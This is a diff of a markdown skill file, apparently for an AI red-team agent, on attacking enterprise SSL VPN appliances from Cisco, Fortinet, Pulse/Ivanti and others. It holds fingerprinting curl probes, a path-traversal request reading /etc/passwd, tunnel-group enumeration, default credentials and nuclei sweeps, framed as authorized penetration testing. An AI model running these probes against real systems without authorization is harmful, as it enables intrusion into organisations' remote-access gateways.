@@ -1,9 +1,11 @@
 ---
 name: enterprise-vpn-attack
-description: External SSL VPN / remote-access appliance attack matrix — Cisco ASA/AnyConnect, Fortinet FortiGate/FortiOS, Citrix NetScaler/ADC, Palo Alto GlobalProtect, Pulse Secure / Ivanti Connect Secure, SonicWall, F5 Big-IP. Covers version fingerprinting, CVE matrix (2018-2026), AAA backend identification, default credentials, configuration-disclosure paths, pre-auth RCE/SSRF/path-traversal exploits where applicable. Built from authorized-engagement Cisco ASA testing plus 2024-2026 enterprise VPN CVE landscape. Use whenever the target's perimeter exposes any SSL VPN appliance or remote-access gateway — these are the most common initial-access points in 2024-2026 actor TTPs.
+description: "External SSL VPN / remote-access appliance attack matrix — Cisco ASA/AnyConnect, Fortinet FortiGate/FortiOS, Citrix NetScaler/ADC, Palo Alto GlobalProtect, Pulse Secure / Ivanti Connect Secure, SonicWall, F5 Big-IP. Covers version fingerprinting, CVE matrix (2018-2026), AAA backend identification, default credentials, configuration-disclosure paths, pre-auth RCE/SSRF/path-traversal exploits where applicable. Built from authorized-engagement Cisco ASA testing plus 2024-2026 enterprise VPN CVE landscape. Use whenever the target's perimeter exposes any SSL VPN appliance or remote-access gateway — these are the most common initial-access points in 2024-2026 actor TTPs."
 sources: authorized-engagement, public-advisories, cisa-kev
 report_count: 1
 ---
+
+# Enterprise VPN / Remote-Access Appliance Attack
 
 ## When to use this skill
 
@@ -18,8 +20,6 @@ DO NOT use for:
 - Internal lateral-movement post-foothold (out of scope per user's boundary)
 - VPN client-side bugs (different attack class)
 - IPsec / L2TP / OpenVPN (different protocols, not SSL VPN web stack)
-
----
 
 ## Vendor identification (fingerprinting)
 
@@ -92,8 +92,6 @@ curl -skI 'https://target/my.policy' | head -10
 # Look for: Set-Cookie: BIGipServer*, MRHSession=
 # Server: BIG-IP (sometimes)
 ```
-
----
 
 ## CVE matrix — pre-auth or auth-bypass (2018-2026)
 
@@ -193,8 +191,6 @@ curl -sk --path-as-is 'https://target/dana-na/../dana/html5acc/guacamole/../../.
 | **CVE-2021-20016** | SMA 100 series specific firmware | SQL injection — pre-auth | nuclei template available |
 | **CVE-2024-40766** | SonicOS specific | Access-control flaw | Specific firmware versions |
 
----
-
 ## SAML SP / IdP misconfigurations (always check)
 
 Most enterprise VPNs now use SAML for SSO. Check SP metadata:
@@ -216,8 +212,6 @@ Look for:
 - Audience-restriction validation gaps
 - Public SP signing cert (for replay/forging attacks)
 
----
-
 ## Default credentials (test sparingly — lockout risk)
 
 | Vendor | User | Password | Notes |
@@ -235,8 +229,6 @@ Look for:
 
 ⚠ Most enterprise targets have changed these. Test ≤2 attempts per account to avoid lockout.
 
----
-
 ## Group / tunnel-group enumeration (Cisco-specific)
 
 Cisco ASA AAA groups can sometimes be enumerated without auth.
@@ -251,8 +243,6 @@ for group in DefaultRAGroup DefaultWEBVPNGroup SSLVPN Employees Contractors Vend
 done
 # Larger differential timing = group exists; valid groups respond slower in some builds
 ```
-
----
 
 ## AAA backend identification
 
@@ -270,8 +260,6 @@ After auth fails, look at error response details:
 | `Invalid username or password` (generic) | LDAP or local DB |
 
 If you see SAML/Entra in the flow, pivot to `m365-entra-attack` skill for cred-spray strategy.
-
----
 
 ## Common probe sequence (5-minute fingerprint)
 
@@ -302,8 +290,6 @@ curl -skI "https://$TARGET/dana-na/auth/url_default/welcome.cgi" 2>&1 | head -3
 curl -sk --path-as-is "https://$TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" -o /tmp/pulse_cve.txt; head -c 200 /tmp/pulse_cve.txt
 ```
 
----
-
 ## Nuclei templates for fast triage
 
 Nuclei has high-quality templates for most of the above CVEs. Single command sweeps:
@@ -316,8 +302,6 @@ nuclei -u https://target/ \
 
 Add `-as` (auto-scan) for broader vuln coverage but slower.
 
----
-
 ## Operational discipline
 
 - **Banner-stripped servers (no version disclosure)** are good defense-in-depth — record as positive finding even if no CVE found
@@ -326,16 +310,12 @@ Add `-as` (auto-scan) for broader vuln coverage but slower.
 - **Don't run pre-auth-RCE PoCs in red team without explicit OK** — accidentally bricking a VPN concentrator = catastrophic for the client. Detection-only tests first, then escalate with permission.
 - **Document the AAA backend identification** — knowing whether ASA uses RADIUS-to-local vs SAML-to-Entra changes downstream attack paths.
 
----
-
 ## Bridge to neighboring skills
 
 - `m365-entra-attack` — when AAA backend is Entra SAML; cred-spray strategy carries over
 - `hunt-saml` — XSW / signature-stripping if SAML SP is misconfigured
 - `mid-engagement-ir-detection` — appliances generate noisy logs; watch for IPS rules being deployed mid-engagement
 - `redteam-mindset` — banner-stripped ≠ "not vulnerable"; keep digging via behavioral fingerprints
-
----
 
 ## Anti-patterns
 
@@ -344,8 +324,6 @@ Add `-as` (auto-scan) for broader vuln coverage but slower.
 - **Don't run heavy nuclei scans without rate-limiting** — these appliances are critical infrastructure
 - **Don't fingerprint by trying all CVE PoCs immediately** — start with non-disruptive HEAD + version-banner probes
 - **Don't skip SAML metadata** — even when the appliance is patched, SAML SP misconfig is its own attack surface
-
----
 
 ## Related Skills & Chains
 
